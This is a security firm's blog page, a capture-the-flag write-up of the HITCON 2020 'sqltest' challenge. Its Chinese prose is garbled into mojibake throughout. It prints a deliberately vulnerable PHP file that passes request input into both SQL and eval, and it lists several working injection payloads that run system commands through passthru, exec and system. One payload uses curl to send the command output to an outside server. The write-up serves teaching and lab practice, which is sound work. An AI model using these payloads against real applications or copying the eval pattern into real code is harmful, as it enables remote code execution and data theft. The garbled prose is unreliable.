
<!DOCTYPE html>
<html lang="zh-TW">
  <head>
    <meta charset="utf-8" />
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <title>DEVCORE Wargame at HITCON 2020 | DEVCORE æˆ´å¤«å¯‡çˆ¾</title><link href="/assets/themes/devcore-v2/stylesheets/webpack_bundle.css" rel="stylesheet" />
    <link href="/assets/themes/devcore-v2/images/favicon.png" rel="icon" size="32x32">
    <meta name="description" property="og:description" content="HITCON 2020 DEVCORE Wargame å…¶ä¸­ä¸€é¡Œ sqltest è§£æã€‚éœ€è¦æ§‹é€ ä¸€å€‹å­—ä¸²ï¼ŒåŒæ™‚ç‚ºåˆæ³•çš„ SQL èªå¥èˆ‡ PHP èªå¥ï¼Œè®“ SQL åŸ·è¡Œæ™‚æœ‰å›å‚³å€¼ä¸” PHP åŸ·è¡Œæ™‚èƒ½å¤ åŸ·è¡Œä»»æ„ç³»çµ±æŒ‡ä»¤ã€‚" />
    <meta name="keywords" content="wargame, sqltest" />
    <meta property="og:site_name" content="DEVCORE æˆ´å¤«å¯‡çˆ¾" />
    <meta property="og:title" content="DEVCORE Wargame at HITCON 2020 | DEVCORE æˆ´å¤«å¯‡çˆ¾" />
    <meta property="og:url" content="https://devco.re/blog/2020/10/30/devcore-wargame-at-hitcon-2020/" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://devco.re/assets/img/blog/20201030/cover.png" />
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="d3vc0r3">
    <meta name="twitter:title" content="DEVCORE Wargame at HITCON 2020 | DEVCORE æˆ´å¤«å¯‡çˆ¾">
    <meta name="twitter:description" content="HITCON 2020 DEVCORE Wargame å…¶ä¸­ä¸€é¡Œ sqltest è§£æã€‚éœ€è¦æ§‹é€ ä¸€å€‹å­—ä¸²ï¼ŒåŒæ™‚ç‚ºåˆæ³•çš„ SQL èªå¥èˆ‡ PHP èªå¥ï¼Œè®“ SQL åŸ·è¡Œæ™‚æœ‰å›å‚³å€¼ä¸” PHP åŸ·è¡Œæ™‚èƒ½å¤ åŸ·è¡Œä»»æ„ç³»çµ±æŒ‡ä»¤ã€‚">
    <meta name="twitter:creator" content="d3vc0r3">
    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20201030/cover.png">
    <meta name="twitter:domain" content="devco.re">
    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
    <meta name='yandex-verification' content='4561963cf1d18fe3' />
    <meta property="fb:admins" content="120968921404653" />

    <link rel="canonical" href="https://devco.re/blog/2020/10/30/devcore-wargame-at-hitcon-2020/"/>
    <link rel="alternate" type="application/rss+xml" title="DEVCORE æˆ´å¤«å¯‡çˆ¾" href="https://devco.re/rss">

    <!-- Google Tag Manager -->
    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-K5B8NW');</script>
    <!-- End Google Tag Manager -->
  </head>
  <body>
    <div class="page">
      <div class="container--wrapper">
        <div class="topbar">
          <div class="topbar__brand">
            <a href="/">
                <div class="logo">
                  DEVCORE æˆ´å¤«å¯‡çˆ¾
                </div></a>
            <p class="slogan">
              æˆ‘å€‘æä¾›<a href="/services/penetration-test" class="link">æ»²é€æ¸¬è©¦</a>ã€<a href="/services/red-team" class="link">ç´…éšŠæ¼”ç·´</a>ã€<a href="/services/security-consulting" class="link">è³‡å®‰é¡§å•</a>èˆ‡<a href="/services/security-training" class="link">æ•™è‚²è¨“ç·´</a>æœå‹™
            </p>
          </div>
          <div class="drawer" id="drawer">
            <div class="drawer__container">
              <nav class="main-menu">
                <div class="hidden">
                  ä¸»é¸å–®
                </div>
                <a href="/services/penetration-test" class="main-menu__link mobile-only">æ»²é€æ¸¬è©¦</a>
                <a href="/services/red-team" class="main-menu__link mobile-only">ç´…éšŠæ¼”ç·´</a>
                <a href="/services/security-consulting" class="main-menu__link mobile-only">è³‡å®‰é¡§å•</a>
                <a href="/services/security-training" class="main-menu__link mobile-only">æ•™è‚²è¨“ç·´</a>
                <a href="/about/" class="main-menu__link">é§­å®¢æ€ç¶­</a><a href="/blog/" class="main-menu__link">æœ€æ–°è¨Šæ¯</a><a href="/search/" class="main-menu__link main-menu__search desktop-only"><span class="hidden">æœå°‹</span><svg class="icon-search icon"><use xlink:href="#icon-search" /></svg></a>
              </nav>
              <a href="/contact/" class="drawer__contact button--dense">è¯çµ¡æˆ‘å€‘</a>
              <nav class="lang-menu">
                <div class="lang-menu__label">
                  èªè¨€:
                </div>
                <a href="/" class="lang-menu__link">ä¸­æ–‡</a>
                <a href="/en/" class="lang-menu__link">English</a>
              </nav>
            </div>
          </div><span class="topbar__menu mobile-only">menu</span><button class="appearance-none topbar__hamburger mobile-only" data-toggle="#drawer" id="drawer-toggle" type="button">
            <div class="bars">
              <div class="bar"></div>
              <div class="bar"></div>
              <div class="bar"></div>
            </div>
          </button>
        </div>
      </div><main role="main">


          <div class="container--wrapper">
            <div class="container">
              <section class="blog-header">
                <small class="blog-header__category"><a href="/blog/category/æŠ€è¡“å°ˆæ¬„/">æŠ€è¡“å°ˆæ¬„</a></small>
                <img src="https://devco.re/assets/img/blog/20201030/cover.png" class="blog-header__image" alt="DEVCORE Wargame at HITCON 2020" />
                <h1 class="blog-header__title">
                  DEVCORE Wargame at HITCON 2020
                </h1>
                <div class="blog-header__tags">
                  
                  <a href="/blog/tag/PHP/" class="blog-header__tag">PHP</a><a href="/blog/tag/RCE/" class="blog-header__tag">RCE</a>
                </div>
          
          
                <p class="blog-header__info">
                  By <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/cyku.jpg)"></span> <a href="/blog/author/cyku" class="author-name">Cyku</a> <time class="date">on 2020-10-30 </time>
                </p>
          
              </section>
              <article class="article">
          <style type="text/css">
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
</style>

<p>æ­æ™šå®‰ï½ä¸€å¹´ä¸€åº¦çš„è³‡å®‰åœˆå¤§æ‹œæ‹œæ´»å‹•ä¹‹ä¸€ HITCON 2020 åœ¨ç´„ä¸€å€‹æœˆå‰é †åˆ©è½å¹•å•¦ï¼Œä»Šå¹´æˆ‘å€‘ç…§èˆŠåœ¨æ”¤ä½æº–å‚™äº†å¹¾é“å°å°çš„ Wargame çµ¦æœƒçœ¾æœ‹å‹å€‘æŒ‘æˆ°è‡ªèº«æŠ€è¡“ï¼Œä¸¦åŒæ¨£æº–å‚™äº†å¹¾ä»½ç²¾ç¾å°ç¦®ç‰©é€çµ¦æŒ‘æˆ°æˆåŠŸçš„æœ‹å‹å€‘ã€‚</p>

<p>ç¸½è¨ˆæ´»å‹•å…©å¤©é–“æœ‰ç™»å…¥ä¸¦æäº¤è‡³å°‘ä¸€æŠŠ flag çš„äººæ•¸ç‚º 92 äººï¼Œéå¸¸æ„Ÿè¬å¤§å®¶è¸´èºåœ°åƒèˆ‡ï¼Œé€™æ¬¡æœªèƒ½æˆåŠŸåœ¨æ™‚é–“å…§å®ŒæˆæŒ‘æˆ°è€Œæœªé ˜åˆ°å°ç¦®ç‰©çš„æœ‹å‹å€‘ä¹Ÿåˆ¥å¤ªç°å¿ƒï¼Œç‚ºäº†èƒ½æ›´å¤šçš„å›é¥‹ç¤¾ç¾¤ï¼Œæ‰€ä»¥æˆ‘å€‘æ±ºå®šå¯«ä¸€ç¯‡æŠ€è¡“æ–‡ç« ä»‹ç´¹æœ¬æ¬¡ Wargame çš„å…¶ä¸­ä¸€é“é–‹æ”¾å¼é¡Œç›®<code class="highlighter-rouge">sqltest</code>ï¼Œç‚ºæ­¤æˆ‘å€‘åœ¨æ´»å‹•å¾Œè©¢å•äº†æ‰€æœ‰è§£é¡Œçš„äººï¼Œæ”¶é›†äº†å¤§å®¶çš„è§£æ³•èˆ‡æ€è·¯ï¼Œä¸¦å°‡åœ¨æ–‡ç« çš„æ¥ä¸‹ä¾†ä¸€ä¸€ç‚ºå¤§å®¶ä»‹ç´¹ï¼</p>

<h2 id="sqltest-é¡Œç›®èªªæ˜">sqltest é¡Œç›®èªªæ˜</h2>

<p>é€™é“é¡Œç›®ä¸»è¦æ ¸å¿ƒçš„éƒ¨åˆ†å°±é€™ 3 å€‹æª”æ¡ˆï¼šDockerfileã€readflag.c å’Œ index.phpã€‚è®“æˆ‘å€‘å…ˆçœ‹çœ‹å‰å…©å€‹æª”æ¡ˆï¼Œå¯ä»¥å¾ä¸‹æ–¹çš„ Dockerfile ä¸­å…ˆè§€å¯Ÿåˆ° flag è¢«æ”¾ç½®åœ¨æª”æ¡ˆ /flag ä¹‹ä¸­ï¼Œä½†æ¬Šé™è¢«è¨­å®šç‚ºåƒ…æœ‰ root å¯ä»¥è®€å–ï¼Œå¦å¤–æº–å‚™äº†å…·æœ‰ setuid æ¬Šé™çš„åŸ·è¡Œæª” /readflagï¼Œè®“ä»»ä½•äººå‡å¯åœ¨åŸ·è¡Œæ­¤æª”æ¡ˆæ™‚å½è£æˆ root èº«åˆ†ï¼Œè€Œ /readflag çš„åŸå§‹ç¢¼å°±å¦‚ä¸‹æ–¹ readflag.c æ‰€ç¤ºï¼Œå¾ˆå–®ç´”çš„è®€å–ä¸¦è¼¸å‡º /flag æª”æ¡ˆå…§å®¹ï¼Œé€™å€‹é…ç½®å°±æ˜¯ä¸€å€‹å¾ˆæ¨™æº–ä»¥ getshell ç‚ºç›®æ¨™çš„ Wargame é¡Œç›®ã€‚</p>

<p><strong>Dockerfile</strong></p>

<div class="language-dockerfile highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">FROM</span><span class="s"> php:7.4.10-apache</span>

<span class="c"># setup OS env</span>
<span class="k">RUN </span>apt update <span class="nt">-y</span>
<span class="k">RUN </span>docker-php-ext-install mysqli
<span class="k">RUN </span>docker-php-ext-enable mysqli

<span class="c"># setup web application</span>
<span class="k">COPY</span><span class="s"> ./src/ /var/www/html/</span>

<span class="c"># setup flag</span>
<span class="k">RUN </span><span class="nb">echo</span> <span class="s2">"DEVCORE{flag}"</span> <span class="o">&gt;</span> /flag
<span class="k">RUN </span><span class="nb">chmod </span>0400 /flag
<span class="k">RUN </span><span class="nb">chown </span>root:root /flag
<span class="k">COPY</span><span class="s"> readflag.c /readflag.c</span>
<span class="k">RUN </span>gcc <span class="nt">-o</span> /readflag /readflag.c
<span class="k">RUN </span><span class="nb">chmod </span>4555 /readflag
</code></pre></div></div>

<p><strong>readflag.c</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
</span>
<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">seteuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">setegid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/cat /flag"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>ä¸Šè¿°å‰åŠéƒ¨ç‚ºç’°å¢ƒçš„ä½ˆç½®ï¼ŒçœŸæ­£é¡Œç›®çš„é–‹å§‹å‰‡è¦è¦‹ä¸‹æ–¹ index.phpï¼Œå…¶ä¸­ <code class="highlighter-rouge">$_REQUEST</code> æ˜¯æˆ‘å€‘å¯ä»¥ä»»æ„æ§åˆ¶çš„åƒæ•¸ï¼Œé¡Œç›®é™¤äº† isset å¤–ä¸¦ç„¡å…¶ä»–ä»»ä½•æª¢æŸ¥ï¼Œéš¨å¾Œç¬¬ 8 è¡Œä¸­åƒæ•¸è¢«å¸¶å…¥ SQL èªå¥ä½œåŸ·è¡Œï¼Œå¦‚æœ SQL åŸ·è¡ŒæˆåŠŸä¸¦ä¸”æœ‰æŸ¥è©¢åˆ°è³‡æ–™ï¼Œå°±æœƒé€²å…¥ 15 è¡Œé–‹å§‹çš„è™•ç†ï¼Œä¾†è‡ª <code class="highlighter-rouge">$_REQUEST</code> çš„ <code class="highlighter-rouge">$column</code> è®Šæ•¸å†æ¬¡è¢«ä½¿ç”¨ä¸¦å‚³å…¥ eval ä½œåŸ·è¡Œï¼Œé€™æ¨£çœ‹ä¸‹ä¾†é¡Œç›®çš„è§£é¡Œæ€è·¯å°±å¾ˆæ¸…æ¥šäº†ï¼Œæˆ‘å€‘éœ€è¦æ§‹é€ ä¸€å€‹å­—ä¸²ï¼ŒåŒæ™‚ç‚ºåˆæ³•çš„ SQL èªå¥èˆ‡ PHP èªå¥ï¼Œè®“ SQL åŸ·è¡Œæ™‚æœ‰å›å‚³å€¼ä¸” PHP åŸ·è¡Œæ™‚èƒ½å¤ åŸ·è¡Œä»»æ„ç³»çµ±æŒ‡ä»¤ï¼Œå°±èƒ½ getshell ä¸¦å‘¼å« /readflag å–å¾— flagï¼</p>

<p><strong>index.php</strong></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"column"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"id"</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="s1">'No input'</span><span class="p">);</span>
<span class="p">}</span>

<span class="nv">$column</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"column"</span><span class="p">];</span>
<span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"id"</span><span class="p">];</span>
<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"select "</span><span class="o">.</span><span class="nv">$column</span><span class="o">.</span><span class="s2">" from mytable where id ='"</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">"'"</span> <span class="p">;</span>

<span class="nv">$conn</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">(</span><span class="s1">'mysql'</span><span class="p">,</span> <span class="s1">'user'</span><span class="p">,</span> <span class="s1">'youtu.be/l11uaEjA-iI'</span><span class="p">,</span> <span class="s1">'sqltest'</span><span class="p">);</span>

<span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span> <span class="nv">$result</span> <span class="p">){</span>
    <span class="k">if</span> <span class="p">(</span> <span class="nx">mysqli_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
        <span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_object</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
        <span class="nv">$str</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">output = </span><span class="se">\$</span><span class="s2">row-&gt;"</span><span class="o">.</span><span class="nv">$column</span><span class="o">.</span><span class="s2">";"</span><span class="p">;</span>
        <span class="k">eval</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="s1">'Database error'</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$output</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nv">$output</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="å‡ºé¡Œè€…è§£æ³•">å‡ºé¡Œè€…è§£æ³•</h2>

<p>èº«ç‚ºå‡ºé¡Œè€…ï¼Œç•¶ç„¶å¿…é ˆå…ˆæ‹‹ç£šä¸€ä¸‹æ‰èƒ½å¤ å¼•ç‰ï½</p>

<p><strong>exploit:</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column={passthru('/readflag')}&amp;id=1

SQL: SELECT {passthru('/readflag')} FROM mytable WHERE id = '1'
PHP: $output = $row-&gt;{passthru('/readflag')};
</code></pre></div></div>

<p>é€™å€‹è§£æ³•åˆ©ç”¨äº† MySQL ä¸€å€‹ç›¸å®¹æ€§çš„ç‰¹æ€§ï¼Œ<code class="highlighter-rouge">{identifier expr}</code> æ˜¯ ODBC Escape èªæ³•ï¼ŒMySQL ç›¸å®¹äº†é€™å€‹èªæ³•ï¼Œä½¿å¾—åœ¨èªå¥ä¸­å‡ºç¾æ™‚ä¸æœƒå°è‡´èªæ³•éŒ¯èª¤ï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥æ§‹é€ å‡º <code class="highlighter-rouge">SELECT {passthru '/readflag'} FROM mytable WHERE id = '1'</code> å­—ä¸²ä»ç„¶æœƒæ˜¯åˆæ³•çš„ SQL èªå¥ï¼Œæ›´é€²ä¸€æ­¥åœ°å˜—è©¦å°‡ ODBC Escape ä¸­çš„ç©ºç™½ç§»é™¤æ”¹ä»¥æ‹¬è™ŸåŒ…å¤¾å­—ä¸²çš„è©±ï¼Œæœƒè®Šæˆ <code class="highlighter-rouge">SELECT {passthru('/readflag')} FROM mytable WHERE id = '1'</code>ï¼Œç”±æ–¼ MySQL æä¾›çš„èªæ³•å½ˆæ€§ï¼Œæ­¤æ®µèªå¥ä»ç„¶æœƒè¢«è¦–ç‚ºåˆæ³•ä¸¦ä¸”å¯æ­£å¸¸åŸ·è¡Œå¾—åˆ°ç›¸åŒçµæœã€‚</p>

<p>æ¥è‘—å†çœ‹é€²åˆ° eval å‰æœƒæ§‹é€ å‡ºé€™æ¨£çš„ PHP èªå¥ï¼š<code class="highlighter-rouge">$output = $row-&gt;{passthru('/readflag')}</code>ï¼Œç”±æ–¼ PHP åœ¨èªæ³•ä¸Šä¹Ÿæä¾›äº†æ¥µå¤§çš„å½ˆæ€§ï¼Œä½¿å¾—æˆ‘å€‘å¯ä»¥åˆ©ç”¨ <code class="highlighter-rouge">$object-&gt;{ expr }</code> é€™æ¨£çš„èªæ³•å°‡ expr æ•˜è¿°å¥å‹•æ…‹åŸ·è¡Œå®Œçš„çµæœä½œç‚ºç‰©ä»¶å±¬æ€§åç¨±å»å­˜å–ç‰©ä»¶çš„å±¬æ€§ï¼Œå› æ­¤çµæœå°±æœƒå‘¼å« passthru å‡½å¼åŸ·è¡Œç³»çµ±æŒ‡ä»¤ã€‚</p>

<p>é€™é‚Šè£œå……ä¸€å€‹å†·çŸ¥è­˜ï¼Œç•¶æƒ³åˆ°ç³»çµ±æŒ‡ä»¤æ™‚ï¼Œå¤§å®¶ç›´è¦ºå¯èƒ½æœƒæƒ³åˆ°ä½¿ç”¨ system å‡½å¼ï¼Œä½†æ˜¯ MySQL åœ¨ 8.0.3 ä¸­å°‡ system åŠ å…¥é—œéµå­—ä¿ç•™å­—ä¹‹ä¸­ï¼Œè€Œé€™é¡Œç›®ç’°å¢ƒæ˜¯ä½¿ç”¨ MySQL 8.0 æ¶è¨­çš„ï¼Œæ‰€ä»¥å¦‚æœä½¿ç”¨ system çš„è©±åè€Œæœƒå¤±æ•—å”·ï¼</p>

<h2 id="ä¾†è‡ªæœƒçœ¾æœ‹å‹å€‘çš„è§£æ³•">ä¾†è‡ªæœƒçœ¾æœ‹å‹å€‘çš„è§£æ³•</h2>

<p>ç”±æ–¼æœ‹å‹å€‘è¸´èºæäº¤çš„è§£æ³•çœ¾å¤šï¼Œæ‰€ä»¥æˆ‘å€‘å°‡å„è§£æ³•ç°¡å–®åšäº†åˆ†çµ„ï¼Œå¦å¤–æé†’ä¸€ä¸‹ï¼Œä»¥ä¸‹é †åºåªæ˜¯æäº¤çš„å…ˆå¾Œæ™‚é–“å·®ï¼Œä¸¦ç„¡ä»»ä½•å„ªåŠ£ï¼Œèƒ½å–å¾— flag çš„è§£æ³•éƒ½æ˜¯å¥½è§£æ³•ï¼æ¥ä¸‹ä¾†å°±è®“æˆ‘å€‘é€²è¡Œä»‹ç´¹å§ã€‚</p>

<h3 id="odbc-escape">ODBC Escape</h3>

<p><strong>by Mico (https://www.facebook.com/MicoDer/):</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column={exec(%27curl%20http://Mico_SRV/?`/readflag`%27)};%23&amp;id=1

SQL: SELECT {exec('curl http://Mico_SRV/?`/readflag`')};# FROM mytable WHERE id = '1'
PHP: $output = $row-&gt;{exec('curl http://Mico_SRV/?`/readflag`')};#;
</code></pre></div></div>

<p>é€™å€‹è§£æ³•èˆ‡å‡ºé¡Œè€…çš„ååˆ†é¡ä¼¼ï¼Œä½†æ²’æœ‰ä½¿ç”¨å¯ä»¥ç›´æ¥è¼¸å‡ºçµæœçš„ passthru è€Œæ˜¯æ”¹ç”¨ execï¼Œæ¥è‘—é€é curl æŠŠçµæœå›å‚³è‡³è‡ªå·±çš„ä¼ºæœå™¨ï¼Œæ“šæœ¬äººèªªæ³•æ˜¯å› ç‚ºã€Œè¦ºå¾—é§­å®¢å°±è©²å‚³äº›ä»€éº¼å›ä¾†è‡ªå·±Server XD ã€XDã€‚</p>

<h3 id="comment-everywhere">Comment Everywhere</h3>

<p>å¹¾ä¹æ‰€æœ‰ç¨‹å¼èªè¨€éƒ½æœ‰è¨»è§£ç¬¦è™Ÿå¯ä»¥è®“é–‹ç™¼äººå“¡åœ¨ç¨‹å¼ç¢¼ä¸­é–“åŠ ä¸Šæ–‡å­—èªªæ˜ï¼Œä»¥ä¾¿ä¸‹ä¸€å€‹é–‹ç™¼äººå“¡æ¥æ‰‹æ™‚å¯ä»¥å¿«é€Ÿç†è§£é€™æ®µç¨‹å¼ç¢¼çš„æ„ç¾©ã€‚ç•¶ç„¶ SQL èˆ‡ PHP ä¹Ÿæœ‰å„è‡ªçš„è¨»è§£ç¬¦è™Ÿï¼Œä½†å®ƒå€‘æ‰€æ”¯æ´çš„ç¬¦è™Ÿè¡¨ç¤ºç¨å¾®æœ‰äº›å·®ç•°ï¼Œè€Œé€™å°å·®ç•°å°±å¯ä»¥å¹«åŠ©æˆ‘å€‘é”æˆç›®çš„ã€‚</p>

<p><strong>by LJP (https://ljp-tw.github.io/blog/)</strong>:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id%0a-- /*%0a-- */ ; system('/readflag');%0a&amp;id=1

SQL: SELECT id
     -- /*
     -- */ ; system('/readflag');
     FROM mytable WHERE id = '1'
PHP: $output = id
     -- /*
     -- */ ; system('/readflag');
     ;
</code></pre></div></div>

<p>é€™å€‹è§£æ³•çœ‹ä¼¼è¤‡é›œï¼Œæœ¬è³ªä¸Šå…¶å¯¦å¾ˆå–®ç´”ï¼Œå°±æ˜¯åˆ©ç”¨å…©å€‹èªè¨€æ”¯æ´ä¸åŒè¨»è§£ç¬¦è™Ÿçš„ç‰¹æ€§ã€‚å°æ–¼ SQL è€Œè¨€ï¼Œ<code class="highlighter-rouge">--</code> æ˜¯è¨»è§£ç¬¦è™Ÿï¼Œæœƒç„¡è¦–å¾Œæ–¹æ‰€æœ‰åˆ°æ›è¡Œç‚ºæ­¢çš„æ–‡å­—ï¼Œæ‰€ä»¥æ¯ä¸€è¡Œä»¥ <code class="highlighter-rouge">--</code> é–‹é ­çš„å­—ä¸²ï¼ŒSQL æ˜¯çœ‹ä¸è¦‹çš„ã€‚æ¥è‘—ä¾†çœ‹ PHPï¼Œå°æ–¼ PHP è€Œè¨€ï¼Œ<code class="highlighter-rouge">/* ä»»ä½•å­—ä¸² */</code> é€™æ˜¯è¨»è§£çš„è¡¨ç¤ºæ–¹å¼ï¼Œé–‹é ­çµå°¾ç”± / èˆ‡ * çµ„æˆï¼Œä¸­é–“è¢«åŒ…å¤¾çš„å­—ä¸²æ˜¯çœ‹ä¸è¦‹çš„ï¼Œä¸¦ä¸”æ”¯æ´æ›è¡Œï¼Œè€Œ <code class="highlighter-rouge">--</code> åœ¨ PHP ä¹‹ä¸­å‰‡ä»£è¡¨éæ¸›é‹ç®—å­ï¼Œæ‰€ä»¥å¦‚ <code class="highlighter-rouge">$output --</code> å­—ä¸²å…¶å¯¦æ˜¯åœ¨å° $output é€²è¡Œæ¸› 1 çš„æ“ä½œã€‚ç¶œåˆä¸Šé¢ç‰¹æ€§ï¼Œå°æ–¼ä¸Šé¢çš„è§£æ³•ï¼Œå…¶å¯¦åªæœ‰ PHP çœ‹è¦‹çš„ç¬¬ä¸‰è¡Œ ` ; system(â€˜/readflagâ€™);` æœƒèªç‚ºæ˜¯éœ€è¦åŸ·è¡Œçš„ç¨‹å¼ç¢¼ï¼Œå…¶é¤˜éƒ¨åˆ†ä¸è«–æ˜¯ SQL é‚„æ˜¯ PHP éƒ½ä»¥ç‚ºæ˜¯è¨»è§£çš„å­—ä¸²è€Œç„¡è¦–ï¼Œå› æ­¤å¯ä»¥é †åˆ©åŸ·è¡Œå–å¾— flagã€‚</p>

<p><strong>by ankleboy (https://www.facebook.com/profile.php?id=100001963625238):</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=name%20/*!%20from%20mytable%20*/%20--%20;%20system(%22/readflag%22)&amp;id=1

SQL: SELECT name /*! from mytable */ -- ; system("/readflag") FROM mytable WHERE id = '1'
PHP: $output = $row-&gt;name /*! from mytable */ -- ; system("/readflag");
</code></pre></div></div>

<p>æ­¤è§£æ³•ä¹Ÿæ˜¯åŒæ¨£é‹ç”¨è¨»è§£ï¼Œä½†ä½¿ç”¨çš„è¨»è§£ç¬¦è™Ÿä¼¼ä¹ç¨å¾®ç‰¹æ®Šï¼Œ<code class="highlighter-rouge">/* */</code> é™¤äº† PHP ä¹‹å¤–ï¼ŒMySQL ä¹ŸåŒæ¨£æ”¯æ´æ­¤å…è¨±å¤šè¡Œçš„è¨»è§£ç¬¦è™Ÿï¼Œä½†å‡å¦‚å¤šä¸Šä¸€å€‹é©šå˜†è™Ÿ <code class="highlighter-rouge">/*! */</code>ï¼Œäº‹æƒ…å°±åˆç¨å¾®ä¸åŒäº†ï¼Œé€™æ˜¯ MySQL ç‰¹æœ‰çš„è®Šç¨®è¨»è§£ç¬¦è™Ÿï¼Œåœ¨æ­¤ç¬¦è™Ÿä¸­çš„å­—ä¸²ï¼Œä»ç„¶æœƒè¢« MySQL ç•¶æˆ SQL çš„ä¸€éƒ¨åˆ†åŸ·è¡Œï¼Œä½†åœ¨å…¶ä»– DBMS ä¹‹ä¸­ï¼Œå› ç‚ºæ˜¯ <code class="highlighter-rouge">/*</code> é–‹é ­å°±æœƒèªç‚ºå®ƒå°±æ˜¯å–®ç´”çš„è¨»è§£æ–‡å­—è€Œå¿½è¦–ï¼Œè®“é–‹ç™¼äººå“¡èƒ½æ’°å¯«å¯ portable çš„ç¨‹å¼ç¢¼ã€‚å› æ­¤å°±èƒ½è£½é€ å‡ºä¸€ä¸²è¨»è§£æ–‡å­—å¯è¢« MySQL çœ‹è¦‹ä½†ç„¡æ³•è¢« PHP çœ‹è¦‹ï¼Œå¼·åˆ¶åœ¨è¨»è§£æ–‡å­—è£¡è®“ SQL æ§‹é€ åˆæ³•èªå¥ï¼Œå†åˆ©ç”¨ <code class="highlighter-rouge">--</code> è¨»è§£é–‰åˆæ‰€æœ‰å†—è´… SQL èªå¥ï¼Œç·Šæ¥è‘— <code class="highlighter-rouge">--</code> å¾Œå°±èƒ½æ’°å¯«ä»»æ„ PHP åŸ·è¡Œç¢¼ã€‚</p>

<p><strong>by FI:</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`%23?&gt;&amp;id=1

SQL: SELECT id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`#?&gt; FROM mytable WHERE id = '1'
PHP: $output = $row-&gt;id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`#?&gt;;
</code></pre></div></div>

